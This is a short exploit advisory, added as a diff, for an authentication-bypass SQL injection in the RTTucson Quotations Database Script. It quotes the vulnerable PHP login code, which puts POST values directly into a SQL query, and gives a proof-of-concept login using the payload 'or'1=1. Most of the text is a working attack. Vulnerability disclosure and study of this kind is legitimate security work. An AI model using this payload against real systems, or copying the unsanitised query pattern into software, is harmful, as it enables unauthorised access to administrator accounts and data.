@@ -1,0 +1,20 @@
+# RTTucson Quotations Database Script (Auth Bypass) SQL Injection Vulnerability
+# By cr4wl3r http://bastardlabs.info
+# Script: http://www.rttucson.com/files.html
+
+# Bugs found /quotations/admin/include/login.php
+---------------------------
+36 if ($_POST['submit']) {
+37
+38 $Username = $_POST['Username'];
+39 $Password = md5($_POST['Password']);
+40
+41 $query = "SELECT * from UsersTBL WHERE Username='$Username' AND Password='$Password'";
+42 $result = mysql_query($query) or die ( mysql_error() );
+---------------------------
+
+Proof of Concept
+
+  http://bastardlabs/[path]/admin/include/login.php
+  Username: 'or'1=1
+  Password: cr4wl3r
